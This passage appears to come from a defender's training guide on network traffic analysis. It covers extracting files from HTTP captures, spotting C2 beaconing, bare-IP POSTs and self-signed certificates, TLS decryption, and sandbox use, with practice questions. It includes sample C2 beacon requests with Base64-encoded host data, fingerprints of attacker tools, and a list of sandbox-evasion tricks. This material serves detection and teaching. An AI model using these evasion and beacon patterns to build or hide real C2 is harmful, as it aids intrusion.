  1. Source (Host) — real jQuery comes from code.jquery.com, a major CDN or the site itself; an unfamiliar domain serving jQuery is odd (the Referer code.jquery.com is decoration)
  2. Interval — browsers cache jQuery and don't refetch it every 60 seconds; mechanical repetition = a program
  3. Encryption — CDN libraries over http are rare in 2026
  4. Size — the real minified jQuery 3.3.1 is about 85 KB, but the response is a few KB; occasional size changes mark command delivery
  5. Cookie — a long, ever-changing cookie on a static-file request (carrying data)
  6. Process — the connecting process via Sysmon Event ID 3; if it isn't a browser, it's nearly certain

Lesson: well-configured C2 makes each field look normal, so judge by the combination of source, interval, size and process, not field by field.

docs.title: Malicious Files on Good Sites, File Extraction, Frequent Requests, Bare-IP Connections
Malicious Files on Good Sites, File Extraction, Frequent Requests, Bare-IP Connections
docs.text:
What this page covers

Spreading malware through reputable cloud-sharing services and the one clue left behind (the file itself), safely extracting files from HTTP traffic with Wireshark, tshark and Zeek, rules and tools for spotting the frequent, regular GETs and POSTs C2 produces, and why requests straight to an IP with no domain and POSTs to the site root (/) are suspicious. Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Changed]/[Caution] = what changed recently and what is risky if done the old way. Beacon interval analysis is detailed in Beaconing & C2 detection and file records in Zeek files.log.

docs.title: Eight key points
docs.text:
1. Attackers upload malware to reputable services such as Dropbox, OneDrive and Google Drive and send links. Host, User-Agent and method are all normal; only the file itself remains as a clue.
  2. In an unencrypted HTTP capture, Wireshark's File → Export Objects → HTTP extracts files.
  3. Handle extracted executables and scripts only where a double-click can't run them (a Linux analysis machine).
  4. HTTP C2 must keep checking in to receive commands, leaving repeated GETs and POSTs.
  5. Especially suspicious together: many + regular + never-seen domain + to the site root (/) + encoded bodies.
  6. Rules like "more than 100 POSTs in an hour to a site outside the popular list" are simple and effective but miss slow beacons; add periodicity tools (RITA, etc.).
  7. Normal internet traffic almost always uses host names. An IP address in the Host header is suspicious.
  8. POSTs normally go to a script (.php) or API path; a POST straight to / is odd.

docs.title: Malicious files served from good sites
docs.text:
Why it's dangerous. Nearly every organisation allows HTTP, making it an ideal delivery channel — especially via reputable cloud services anyone can upload to (Dropbox, OneDrive, Google Drive, …). In 2018, for example, the Lazarus group ran targeted phishing through Dropbox share links.

What an analyst can see in such a case:

Field State Host A "known good" service such as www.dropbox.com (whether policy allows it is a separate question) User-Agent The user's real browser Referer Absent or webmail when opened from an email Method/path An ordinary download GET File The only clue left

The good domain ≠ safe URL principle applies directly. Headers can't decide it, so you extract the file and examine it. Fortunately, if the connection is decrypted, you can carve the file out of the network stream or have tools extract it automatically.

docs.title: Wireshark
docs.text:
1. Open the capture.
  2. Choose File → Export Objects → HTTP (the same menu also covers TFTP, SMB, IMF (email) and DICOM).
  3. Pick the download transaction from the list.
Packet  Hostname                     Content Type               Size        Filename
1482    docs-share-cloud.example     application/octet-stream   1,245 kB    Remittance_2026-11.zip
1530    docs-share-cloud.example     text/html                  18 kB       view
  • Packet — the packet where the object finished (jump there to see the transaction)
  • Hostname — the Host header value
  • Content Type — the type the server claims (real type via magic bytes)
  • Size — size

  • Filename — taken from the end of the URL path or Content-Disposition

  • Click Save. Then hash it, check its signature, scan it, and look up the hash's reputation.

docs.title: tshark (command line)
docs.text:
For large or many captures the command line is easier:

$ mkdir -p /cases/2026-1104/objects
$ tshark -r capture.pcap --export-objects http,/cases/2026-1104/objects
$ sha256sum /cases/2026-1104/objects/*
9b2f...e41a  /cases/2026-1104/objects/Remittance_2026-11.zip
  • mkdir -p ... — create a folder for the extracted files (-p creates parent folders too)
  • tshark -r capture.pcap — read the capture (-r = read)
  • --export-objects http,<folder> — export every HTTP object into that folder
  • sha256sum ... — compute each file's SHA-256 hash for reputation lookups

docs.title: Automatic extraction with Zeek
docs.text:
Configured to do so, Zeek hashes and extracts files automatically as they pass, so you can find them in files.log later without re-searching captures. Fields and configuration are on Zeek files.log.

[Caution] Keep extracted files where they can't detonate

If the extracted file is a Windows executable, save it on a non-Windows analysis machine (Linux, etc.) so an accidental double-click can't run it. Treat scripts Windows runs on double-click (.js, .vbs, .ps1, .hta, .bat, …) the same way. It's easy to think you'd never slip, but one mistake means a machine you can no longer trust and must rebuild — a dedicated analysis machine is far cheaper. When handing files to others, put them in a password-protected ZIP (conventionally with the password infected) so antivirus doesn't delete them and nobody opens them by accident.

[Added] If the traffic is encrypted. The above only works for decrypted (or plaintext) HTTP. For HTTPS, realistic alternatives are a TLS-inspecting proxy's storage feature, the endpoint (EDR collecting downloaded files), or the mail gateway's attachment retention. HTTP/2 object export may not work depending on the tool and version; then inspect DATA frames via Follow → HTTP/2 Stream or use Zeek extraction.

docs.title: Frequent, regular GETs and POSTs
docs.text:
Why they happen. Malware using HTTP for C2 must keep asking the server for the attacker's commands (checking in). For a responsive remote shell it may ask several times a second; to stay quiet, perhaps once a day. Either way, it leaves repeated requests.

Especially suspicious together:

Signal Why Many People don't hit the same address hundreds or thousands of times a day Regular People are irregular; programs keep fixed intervals Never-seen or untrusted domain Not on popular-site lists To the site root (/) Normal requests usually go to specific paths or APIs Encoded request/response bodies Base64 and the like

A simple rule. Something like "alert when more than 100 POSTs go to a site outside the top 1,000 within an hour". Counting similarly from Zeek logs:

$ cat http.log | zeek-cut id.orig_h host method | awk '$3=="POST"' | sort | uniq -c | sort -rn | head -5
   1440 10.1.5.77    sync-metrics-api.example   POST
    212 10.1.5.23    graph.microsoft.com        POST
     96 10.1.5.40    login.microsoftonline.com  POST
     41 10.1.5.12    collector.analytics.example POST
     12 10.1.5.31    forms.office.com           POST
  • zeek-cut id.orig_h host method — keep source IP, Host and method
  • awk '$3=="POST"' — keep lines whose third column (method) is POST
  • sort | uniq -c — count identical (PC, host, method) combinations
  • sort -rn — largest counts first (-r reverse, -n numeric)
  • head -5 — top five

Reading it:

  • Line 1 — one PC POSTs 1,440 times a day to a never-seen sync-metrics-api.example = exactly once a minute (24 h × 60 min). Top beacon suspect
  • Lines 2–3 — Microsoft services; filter with popular-site lists and baselines
  • Line 4 — an analytics collector; could be a site's tracking script — check

[Added] Slow beacons can be caught too. Count rules miss a beacon that calls once a day, so use tools that measure interval regularity directly. The open-source RITA (Real Intelligence Threat Analytics), for instance, scores how consistent connection intervals and data sizes are in Zeek logs, finding periodic signals even with long gaps. The method and how to compute it yourself are in Beaconing & C2 detection.

docs.title: Straight to an IP with no domain: naked IPs
docs.text:
Why it's suspicious. Normal internet traffic almost always uses host names — easier for people, and programs keep working when server IPs change. So a request straight to an IP address deserves attention, and the Host header tells you:

POST / HTTP/1.1
Host: 203.0.113.58
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/octet-stream
Content-Length: 344

(binary data)
  • Host: 203.0.113.58 — an IP address, not a name; a host-name connection would show the name here
  • POST / — data sent straight to the server root (top folder). POSTs normally go to a server script like login.php or an API like /api/v2/...; the bare root is odd
  • A short fake User-Agent with a platform but no browser name
  • An opaque binary body

[Added] Spotting bare-IP HTTPS. TLS announces the site name via SNI, but by standard IP addresses aren't put in SNI. A direct-to-IP HTTPS connection therefore shows an empty server_name in Zeek ssl.log, and the server certificate often doesn't match the IP (errors in validation_status). "No SNI + never-seen external IP + regular interval" is a strong C2 signal.

There are legitimate exceptions. Vendor remote management, IoT devices, old internal apps and cloud VM metadata addresses (169.254.169.254, a normal address used only inside clouds) may talk by IP. Treat bare-IP traffic not as "malicious" but as "needs an explanation", and identify the device and process.

docs.title: 2026 perspective
docs.text:
[Still valid in 2026]

"Reputable services carry malicious files", "extract and inspect files when decrypted", "C2 leaves repetition" and "bare-IP connections and root POSTs are suspicious" all hold.

[Changed]

  • Popular-site ranking lists changed. The once-ubiquitous Alexa ranking shut down in 2022; today people use the Tranco list, Cisco Umbrella's popularity list, Cloudflare Radar rankings and similar. Still, popular ≠ safe (popular cloud services get abused).
  • The range of abused "good services" grew. Beyond cloud storage: GitHub, Discord and Telegram file sharing, collaboration-tool links, and free subdomains such as Cloudflare Workers or tunnels.
  • File acquisition is endpoint-centred. With most traffic HTTPS, network extraction is hard, so EDR collects downloaded files, and browser download history plus MotW (Mark of the Web, the tag Windows puts on internet-downloaded files) establish origin.
  • C2 frameworks add jitter. Cobalt Strike, Sliver and others randomise intervals by default to avoid "exactly 60 seconds", so statistical detection looking at interval mean/variance and size consistency (RITA, NDR products) matters more.

[Caution] Wrong or risky if done the old way

  • Don't blanket-exclude repeated requests to popular sites. Attackers using cloud APIs (collaboration tools, storage APIs) as C2 sail straight through popularity filters; keep exclusions narrower than whole domains.
  • Don't save extracted files on an analyst's everyday Windows PC.
  • Alerting on or blocking every bare-IP connection breaks business devices. Manage exceptions with an asset list and baselines.

docs.title: Question 1
docs.text:
A staff member downloaded Remittance_2026-11.zip (1.2 MB) from docs-share-cloud.example via an email link. You have a plaintext HTTP capture; Host, User-Agent and method all look ordinary. How do you extract the file, and what do you do next?

Answer and explanation

Extract: Wireshark File → Export Objects → HTTP, pick the transaction, Save — or on the command line tshark -r capture.pcap --export-objects http,<folder>. Save it somewhere safe, such as a Linux analysis machine.

Then:

  1. Hash it with sha256sum and look up the reputation (hash first, before uploading anywhere public)
  2. List the ZIP's contents without extracting (unzip -l, etc.): any .exe, .js, .lnk, .iso or other runnable files?
  3. Confirm real types via magic bytes — names and Content-Type can lie
  4. If needed, observe behaviour in an isolated sandbox
  5. On the staff member's PC, check whether the ZIP was extracted and its contents run (Sysmon Event ID 11 file create, Sysmon 1 / 4688 process create)
  6. Find other recipients of the same link

The headers look normal because the attacker used, or mimicked, a reputable sharing service — leaving the file itself as the only clue.

docs.title: Question 2
docs.text:
A day of Zeek http.log POSTs counted per (PC, host). What do you investigate first, and what's probably normal?

   1440 10.1.5.77    sync-metrics-api.example    POST
    212 10.1.5.23    graph.microsoft.com         POST
     24 10.1.5.88    203.0.113.58                POST
     12 10.1.5.31    forms.office.com            POST
Answer and explanation

Investigate first:

  • Line 1 — 1,440 a day to a never-seen domain = exactly once a minute. Top beacon suspect
  • Line 3 — few requests (24 = once an hour), but the Host is an IP address. At 24 a day it slips under count rules, yet bare IP + regular interval (hourly) is the shape of a slow beacon. Also check whether the path is / and the body is encoded

Probably normal:

  • Line 2 — the Microsoft Graph API, heavily used by Office apps (though Graph has been abused as C2, so confirming the source process is a genuine Office app is worthwhile)
  • Line 4 — Microsoft Forms submissions

Lesson: ranking by count alone misses slow beacons like line 3 — look at bare IPs and interval regularity too.

docs.title: Question 3
docs.text:
Which of these two requests is more suspicious, and why? What would you check for each?

A: POST / HTTP/1.1
   Host: 203.0.113.58:8443
   Content-Type: application/octet-stream

B: GET /api/v1/status HTTP/1.1
   Host: 10.20.0.15
   User-Agent: PrinterAgent/3.2
Answer and explanation

A is far more suspicious:

  • Straight to an external IP (203.0.113.58) with no name, on non-standard port 8443
  • A POST to the root / — not a server script or API path
  • An opaque binary body

Check: the process making the connection (Sysmon Event ID 3), the repetition interval to that IP, the IP's reputation and ownership (which hosting provider and country), the body (Base64? magic bytes?), and persistence on the PC.

B is probably an explainable exception:

  • The destination is an internal IP (10.20.0.15) and the path a specific status API
  • The User-Agent looks like a printer-management agent

Check: that 10.20.0.15 really is a printer (or management server) per the asset list, and that the agent is software the organisation installed. Once confirmed, add it to the baseline (known exceptions) to cut future noise.

docs.title: HTTPS — TLS Decryption, Working Without It, Reading Certificates
HTTPS — TLS Decryption, Working Without It, Reading Certificates
docs.text:
What this page covers

The visibility problem created by near-universal encryption, how TLS decryption (TLS inspection) actually works and where it breaks, what each layer still shows you when you cannot decrypt (IP/ASN, port, SNI and certificate, volume and timing), and how to read a certificate field by field to spot suspicious ones (openssl, Zeek ssl.log/x509.log). Practice questions with explanations at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. The full Zeek TLS field reference is in Zeek ssl.log & x509.log.

docs.title: The 8 key points
docs.text:
1. Encryption protects users but also blinds the security team — and with DoH, it hides DNS too, not just HTTP.
  2. Even when the network goes dark, the endpoint still sees everything. The more encryption grows, the more endpoint telemetry carries the load.
  3. TLS decryption works by planting an organisation-owned root certificate on every PC; a middle device mints a fake certificate per site on the fly and "unlocks and re-locks" traffic in the middle.
  4. Without decryption you still see: destination IP (ASN, geo), port, SNI, the certificate (TLS 1.2 and below), and volume and timing.
  5. What to read in a certificate: Subject/CN and SAN (which site), Issuer (who signed), validity period, organisation fields.
  6. Suspicious certificates: self-signed (Issuer = Subject), random names, a tool's default certificate, a name that doesn't match the SNI, an odd port instead of 443.
  7. [Correction] "Empty organisation fields = malicious" is now a weak signal. Most legitimate sites use DV certificates that carry no organisation data.
  8. TLS 1.3 encrypts the certificate. Reading certificates without decryption only works for TLS 1.2 and below.

docs.title: Almost everything is HTTPS
docs.text:
Why it matters. Encryption protects individuals from snooping and man-in-the-middle attacks (intercepting and altering traffic). The same encryption also blinds the security team. In most organisations most traffic is encrypted, and many teams have no tooling to open it. With DNS now often carried over HTTPS (DoH), failing to decrypt TLS means losing DNS as well as HTTP (Encrypted DNS).

Free, easy certificates from services like Let's Encrypt, and browsers marking non-https sites as "Not secure", accelerated the shift. Attackers use those same free certificates to hide their own traffic.

It is not hopeless. Even when the network view goes completely dark, you can still collect directly on the endpoint (PCs and servers). As encryption grows, endpoint telemetry becomes the main answer to lost network visibility.

You have two broad options: decrypt and look (TLS decryption), or make the most of what is visible without decrypting.

docs.title: How TLS decryption works
docs.text:
Think of it as the company mailroom opening every envelope and forwarding the contents in a fresh envelope. Staff have been told in advance to trust the mailroom's stamp, so they don't question the new envelope.

Client PC  ──HTTPS (key 1)──▶  Decryption device  ──HTTPS (key 2)──▶  Web server
           ◀─ org-signed cert ─┤  decrypt → inspect  ├─ original cert ─▶
                                │  → re-encrypt      │
                                └─▶ IDS/IPS, sandbox, metadata, SIEM
  1. Preparation: the organisation creates its own root certificate authority (Root CA) and pushes that root certificate into the "trusted certificates" store on every company PC. Without this, browsers reject the fake certificates and the whole scheme fails
  2. PC → decryption device: when the PC asks to connect to www.example.com, the device mints a certificate for that site on the fly, signed by the company root CA, and returns it. The PC trusts the company root, so it accepts
  3. Decryption device → site: on the other side the device connects to the real site like a normal client and establishes encryption with the site's real certificate
  4. In the middle: the device is effectively a "man in the middle". Content passes in the clear between the PC-side connection (key 1) and the site-side connection (key 2), so at that point you can run IDS/IPS rules, sandbox files, collect metadata and ship to the SIEM

The user still has an encrypted connection, and the security team can see inside.

[Supplement] Limits and pitfalls of decryption.

Problem Detail Certificate pinning Some apps (banking apps, updaters, some security products) only trust a specific certificate for a server and drop the connection when they see the company certificate → needs an exception Privacy and law Categories like banking, health and personal mail are often exempted. Check national/organisational rules and user notification Protecting the company root CA If that root key leaks, an attacker can mint certificates every company PC trusts → protect it more strictly than anything else Performance and outages Unwrapping and rewrapping every connection costs CPU; a device failure becomes an internet outage Unmanaged devices Personal devices and IoT without the root certificate cannot be inspected New protocols QUIC (HTTP/3) easily bypasses legacy proxies, so UDP 443 is usually blocked to force a fallback to TCP (QUIC policy)

docs.title: What you still see without decryption
docs.text:
No decryption device does not mean giving up. Each layer shows something different.

Layer What is visible How to use it IP (L3) Destination IP, its ASN (whose network) and country Match against bad-IP lists, cheap VPS or unusual countries, Passive DNS for domains tied to that IP TCP (L4) Destination port Mostly 443 and unremarkable, but TLS on a port like 4444 (Metasploit's default) is a detection opportunity Session (TLS) SNI (the site name being requested), TLS version and cipher, the certificate (TLS 1.2 and below), fingerprints (JA3/JA4) Judge the site name (domain signals), assess the certificate (below), client fingerprinting Application (L7) Nothing — path, headers and body are all encrypted bytes — Connection metadata Volume sent and received, timing, connection interval Large uploads (exfiltration), beacon intervals

If you have DNS logs, the name queried just before the connection also tells you the site. But as TLS 1.3 spreads and ECH becomes a standard, even the session layer is shrinking. If you have not yet built a decryption strategy, now is the time to plan one.

docs.title: Reading certificates
docs.text: In TLS 1.2 and below, the server's certificate crosses the wire unencrypted, so you can read it in Wireshark or Zeek without decryption. It is the same information you see in a browser's "View certificate" window.

docs.title: What each field means
docs.text: Field Meaning What to check Subject / Common Name (CN) The site name the certificate was issued to (required) The site the user visited. Does it match the SNI? Subject Alternative Name (SAN) The list of names this certificate is valid for Modern browsers check the name against SAN, not CN Issuer The certificate authority that signed it (required) Same as Subject → self-signed Certificate chain Site → intermediate CA → root CA Does it chain to a root the browser trusts? Not Before / Not After Validity period Brand new? Abnormally long (self-signed often 10 years)? Organization / Locality / Country Organisation, location, country (optional) If filled, a clue to who made it. If empty, see the [Correction] below

docs.title: Look at it yourself with openssl
docs.text:
From an isolated analysis environment you can fetch a server's certificate directly (never connect to a suspicious server from a company PC or company IP).

$ openssl s_client -connect update-cdn-sync.example:443 -servername update-cdn-sync.example </dev/null 2>/dev/null \
    | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
subject=CN = update-cdn-sync.example
issuer=CN = update-cdn-sync.example
notBefore=Nov  2 08:14:51 2026 GMT
notAfter=Oct 31 08:14:51 2036 GMT
X509v3 Subject Alternative Name:
    DNS:update-cdn-sync.example
  • openssl s_client -connect host:443 — opens a TLS connection to the server
  • -servername host — sends the SNI (without it, a server hosting many sites on one IP may return the wrong certificate)
  • </dev/null 2>/dev/null — closes the connection immediately and hides progress messages
  • | openssl x509 -noout — parses the received certificate without printing the raw certificate
  • -subject -issuer -dates -ext subjectAltName — prints only the name, signer, validity period and SAN

Reading the output: subject and issuer are identical → self-signed, issued two days ago with a 10-year validity (impossible for a public certificate), no organisation data. A legitimate public service would use a short-lived certificate signed by a public CA.

docs.title: Reading it in Zeek
docs.text:
ssl.log:
  id.orig_h=10.1.5.77  id.resp_h=203.0.113.58  id.resp_p=4444
  version=TLSv12  cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
  server_name=-  established=T  validation_status=self signed certificate

x509.log:
  certificate.subject=CN=xk29fq.local,O=,C=
  certificate.issuer=CN=xk29fq.local,O=,C=
  certificate.not_valid_before=2026-11-02T08:14:51Z
  certificate.not_valid_after=2036-10-31T08:14:51Z
  san.dns=-
  • id.resp_p=4444 — TLS on 4444 (Metasploit's default port), not 443
  • server_name=- — no SNI → direct-to-IP connection (naked IP)
  • established=T — the TLS handshake succeeded
  • validation_status=self signed certificate — Zeek validated it and found it self-signed (logged when the validation script is enabled)
  • certificate.subject / issuer — both the random-looking xk29fq.local, organisation and country empty
  • 10-year validity, no SAN

That is a very strong C2 indicator.

docs.title: Signs of a suspicious certificate
docs.text:
Signal Why Self-signed (Issuer = Subject) Public services use public CAs. Attackers sometimes generate their own certificate with no details Random or meaningless names, internal names like .local Don't fit a public site A tool's default certificate Attack tools used without configuration send their default certificate (e.g. Cobalt Strike's default keystore CN=Major Cobalt Strike, OpenSSL's default O=Internet Widgits Pty Ltd) SNI and certificate name mismatch Someone else's certificate, fronting, or a man in the middle Odd port + certificate TLS on 4444, 8443, high ports Validity too long for a public certificate Public certificates have a policy maximum (see [Changed] below) The same certificate fingerprint on several unfamiliar IPs Attackers copy one certificate across servers → the fingerprint links their infrastructure

[Correction] "Empty organisation fields = malicious" is a weak signal. It used to be treated as a strong clue that malicious certificates left organisation, locality and country blank. Today DV (domain-validated) certificates such as Let's Encrypt make up most of the web, so most legitimate sites have no organisation data either (DV only proves "owner of this domain" and adds no company information). OV/EV certificates with organisation data filled in go through company verification at issuance, so filled-in fields are a small trust signal and empty fields mean "no conclusion". Likewise "Let's Encrypt = suspicious" is wrong. Attackers use it because it is free, and so do most legitimate sites.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

"Encryption blinds visibility", "decryption is a man in the middle using an organisation root CA", "IP, port, SNI, volume and timing are visible without decryption", "self-signed, random-name and odd-port certificates are suspicious" and "the endpoint is a big part of the answer" all still hold.

[Changed] What has changed

  • Certificate lifetimes keep shrinking. Under the industry body's (CA/Browser Forum) schedule, the maximum validity of public certificates drops to 200 days from 15 March 2026, 100 days from 15 March 2027 and 47 days from 15 March 2029. That makes "the certificate was just issued" a weak signal (legitimate sites renew constantly). Look instead at when the domain's first certificate appeared in Certificate Transparency (CT) logs and the domain registration date. Conversely, a certificate supposedly signed by a public CA but valid longer than these limits is odd.
  • TLS 1.3 is now the majority. TLS 1.3 sends the server certificate encrypted, so reading certificates without decryption only works on TLS 1.2 and below. What remains is the SNI and fingerprints (JA3/JA4), and as ECH (RFC 9849, 2026) spreads, the SNI disappears too (ECH).
  • EV indicators are gone. Browsers removed the company name (the green EV bar) from the address bar, reducing what EV means in practice.
  • Decryption moved to the cloud. Instead of on-prem appliances, cloud secure web gateways (SWG) and SASE platforms commonly do TLS inspection, with an endpoint agent steering traffic to them.
  • EDR and browser telemetry fill much of the gap. Without decryption, EDR still records on the endpoint which process connected where and what it downloaded.

[Caution] Wrong or risky to do the old way

  • Don't call something malicious just because it has no organisation data or uses Let's Encrypt. Most legitimate sites look the same.
  • Don't treat "recently issued certificate" as a strong signal. With short lifetimes, legitimate certificates are always recent. Use domain age and the first CT appearance.
  • Don't make decryption exceptions broad. Attackers try to hide in exempt categories (sites categorised as finance or health, update services). Keep exceptions as narrow as possible and documented.
  • Don't treat the company root CA private key like any other server secret. If it leaks, TLS trust across the whole organisation collapses.

docs.title: Question 1
docs.text:
With no TLS decryption, Zeek logged the following. What is suspicious, and what is your verdict?

ssl.log:  id.orig_h=10.1.5.77  id.resp_h=203.0.113.58  id.resp_p=4444  version=TLSv12
          server_name=-  established=T  validation_status=self signed certificate
x509.log: certificate.subject=CN=xk29fq.local  certificate.issuer=CN=xk29fq.local
          not_valid_before=2026-11-02  not_valid_after=2036-10-31
conn.log: same pair every 60 s, ~1.2 KB each way
Answer and explanation

Almost every field is suspicious.

  • Port 4444 — Metasploit's default. Normal web traffic uses 443
  • No SNI — direct-to-IP connection
  • Self-signed (Subject = Issuer), random-looking .local name, no organisation data
  • 10-year validity — impossible for a public certificate
  • Every 60 seconds at a similar size — a beacon

Verdict: very likely C2 traffic. You can't see the content without decryption, but this combination is ample grounds to act.

Next: isolate the PC, identify the connecting process (Sysmon Event ID 3), block and look up the IP's reputation, and use the certificate fingerprint (cert_chain_fps) to find other IPs using the same certificate in company logs and internet scan data (expanding the attacker's infrastructure).

docs.title: Question 2
docs.text:
After the organisation deploys TLS decryption, one business app and staff banking apps start failing with "cannot connect". Why, and how should it be handled?

Answer and explanation

Cause: certificate pinning. These apps decide "this server only trusts this certificate (or this CA)", so when they receive the company-CA-signed certificate the decryption device minted on the fly, they treat it as a man-in-the-middle attack and drop the connection. Browsers are configured to trust the company root CA, so they are fine, but pinning apps ignore that setting.

Handling:

  1. Add the app's destinations (domains) as decryption exceptions — exempt traffic is only seen as metadata such as SNI, IP and volume
  2. Banking and health categories are often exempted for privacy and legal reasons too. Check organisational rules and user notification
  3. Keep exceptions to the domains that actually need them, and record and review the list — so attackers can't hide in exempt categories
  4. Cover exempt traffic with endpoint telemetry (EDR)

docs.title: Question 3
docs.text:
The same C2 server now talks TLS 1.3. The x509.log certificate data you saw before no longer appears. What is still visible, and how do you keep detecting it?

Answer and explanation

TLS 1.3 sends the server certificate encrypted, so without decryption you cannot read it (Subject, Issuer, validity).

Still visible:

  • IP, ASN, country and port (if it is still 4444, that alone is a clue)
  • SNI (unless ECH is used) — here it is empty because of the direct-to-IP connection, which is itself a clue
  • TLS client and server fingerprints (JA3, JA4, JA4S) — the distinctive shape produced by the malware's TLS library
  • Volume, timing and interval — the 60-second beacon is still visible

Keeping up detection:

  1. Fingerprint- and interval-based detection (JA4 lists, beacon analysis such as RITA)
  2. Find other connections using the same IP, ASN or fingerprint
  3. Endpoint — which process made the connection (Sysmon 3, EDR), extracting the C2 config from memory
  4. Consider widening decryption coverage if needed

docs.title: Screenshots, Sandboxes, and When to Go Manual
Screenshots, Sandboxes, and When to Go Manual
docs.text:
What this page covers

Screenshot services — the easiest way to confirm credential phishing — and how to read their results, how tools differ in whether they share results, sandboxes for when reputation isn't enough (HTML/network-centric vs VM-based) and matching the tool to the question, how malware fools sandboxes, and a map of manual analysis for when automated methods don't answer. Practice questions with answers are at the end.

Labels

[Added] = practical must-know, [Changed]/[Caution] = what changed recently and what is risky if done the old way. The previous step is Attack Stages over HTTP, Analysis Methods, URL Reputation.

docs.title: Eight key points
docs.text:
1. Credential phishing is fastest to confirm by looking at the page; screenshot services open it for you.
  2. Tools differ in whether they publish results. If the link mustn't be seen by others, pick one that doesn't share.
  3. Don't relax because the screenshot matches the real thing. Check the host in the address bar, the certificate's age, and where form input goes.
  4. Two kinds of sandbox: ones that load the page and record HTML and HTTP transactions (network-centric), and ones that open it in a VM and record changes on the host (malware-centric).
  5. Choose by "what do I need to know?": individual requests → network-centric; processes and file changes → VM-based.
  6. Sandboxes get fooled — VM detection, delays, required human clicks, country/device checks.
  7. Company documents uploaded to public sandboxes can be downloaded by others.
  8. When automation doesn't answer, go manual: headers (URL, User-Agent, Host), GET/POST content, files, and anomalies (Base64, bare-IP connections, repetitive beaconing).

docs.title: Confirming credential phishing with screenshots
docs.text:
Why it matters. Credential-phishing sites must imitate Microsoft, Google or bank login screens, so you can often tell at a glance. But user-reported emails don't come with screenshots, and you can't open them on a company PC. So you use services where someone else's computer opens the page and takes a picture.

Tool What it does Result sharing urlscan.io Screenshot plus every HTTP transaction, resource and redirect; great for history of sites since taken down Choose public, unlisted or private URLQuery Screenshot, IDS rule checks, list of loaded resources Public PhishTank Community votes on whether a site is phishing Public (sharing is the point) Hybrid Analysis Screenshot plus a very thorough sandbox analysis Submissions public Simple screenshot services Just take a picture Varies by service Cloudflare URL Scanner Screenshot, network requests, technology stack Choose public or private

Why sharing matters. As covered under OPSEC, leaving a link in a public database can expose victim data or tip off the attacker. Decide "may others see this link?" first, then pick the tool.

docs.title: Reading a scan result
docs.text:
A scan summary typically looks like this (example):

Submitted URL:  https://secure-docs-share.example/view?id=7731
Effective URL:  https://secure-docs-share.example/m365/login.php
Screenshot:     "Sign in" page with Microsoft logo, email + password form
Page title:     Sign in to your account
Main IP:        198.51.100.38  (AS64500 Example Hosting, NL)
TLS cert:       issued 2026-11-03 by Let's Encrypt (1 day old)
Domains:        secure-docs-share.example, aadcdn.msftauth.net, code.jquery.com
Form action:    POST https://secure-docs-share.example/m365/next.php
  • Submitted → Effective URL: where the redirects actually landed; the path m365/login.php is already imitation
  • Screenshot / Page title: copies the Microsoft sign-in screen and title
  • Main IP / AS: a generic hosting company, not Microsoft
  • Certificate issued a day ago: a freshly built site; real login pages don't look like this
  • Domains: images such as the logo come from Microsoft's real CDN (aadcdn.msftauth.net) — a common phishing-kit trick to look genuine
  • Form action: the email and password are POSTed to next.php not at Microsoft → the decisive evidence

Judge the address, not the picture. The question isn't whether the page looks real, but whether it came from Microsoft's real address (login.microsoftonline.com).

docs.title: Going deeper: sandboxes
docs.text:
What it is. When reputation and screenshots aren't enough, use a sandbox — an isolated space where links or files are actually opened and everything that happens is recorded. It follows links, downloads HTML, opens pages in a virtual machine, and watches the host for suspicious changes (new processes, files, registry edits).

Kind What it does Examples Suits HTML/network-centric Loads the page, records HTML and every HTTP request/response, each downloadable urlscan.io Easy for newer analysts VM-based Opens it in a real Windows VM and records process, file and registry changes Hybrid Analysis, ANY.RUN, Joe Sandbox Complex output; suits experienced analysts

Pick the tool by what you need to know:

You want Output to look for The names of JavaScript files a page loads The request list of a network-centric sandbox What the desktop looked like opening the site A VM sandbox's screen recording or screenshots A packet capture (PCAP) of the interaction and downloaded files Sandboxes offering PCAP and file downloads Which IDS rules fire, which ATT&CK techniques apply Sandboxes with IDS alerts and ATT&CK mapping What a file runs on Windows (process tree) A VM sandbox

VM-based sandboxes are strong on malicious files and detailed host verdicts, but their interface isn't centred on network connections. urlscan.io, by contrast, shows actual HTTP transactions request by request, which suits network analysis. Try several tools yourself to learn their strengths.

docs.title: [Added] Sandboxes get fooled
docs.text:
Attackers know about sandboxes and build in "behave if I'm being analysed" features:

Technique What it does VM detection Stops on seeing VM drivers, few CPUs or little memory, or analysis-tool processes Delays Waits minutes to hours (sandboxes usually watch for only a few minutes) Human-activity checks Needs mouse movement, clicks or document scrolling before running Country/device checks (geofencing) Shows the malicious page only to target-country IPs, certain languages or phones Challenge pages Hides phishing behind CAPTCHA or Turnstile

So a clean sandbox result isn't proof. Interactive sandboxes such as ANY.RUN let analysts click and wait, getting past some of these; some services let you pick an exit IP in the target country.

docs.title: When automation fails: manual header and content analysis
docs.text:
When reputation, screenshots and sandboxes don't answer, look yourself. It's slow at first, but after enough good and bad samples you develop a feel for "something's off here". A single signal rarely settles it; conclusions come when several signals point the same way.

Look at What More detail Headers URL, Host (virtual host), User-Agent, … Judging Requests GET/POST content Are parameters or bodies needlessly encoded? POST abuse Files Real type and hash of what was received Response headers Anomalies Base64 content, bare-IP connections with no domain, repetitive beaconing, other oddities The next pages in this section

For example, each signal in this request is weak on its own but strong together:

POST http://198.51.100.77/api/v2/sync        ← naked IP, no domain, plain http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/112.0.0.0
Content-Type: application/octet-stream
body: dXNlcj1qc21pdGgmaG9zdD1GSU4tUEMwNw==   ← Base64
(repeats every 300 s)                         ← beacon
  • Bare IP + http: legitimate services normally use a domain and HTTPS
  • Chrome 112: a 2023 version. Company Chrome auto-updates; if only this value stays frozen for years, it's hard-coded into a program
  • Base64 body: decodes to user=jsmith&host=FIN-PC07 — reporting user and PC name
  • Repeats every 300 s: a beacon
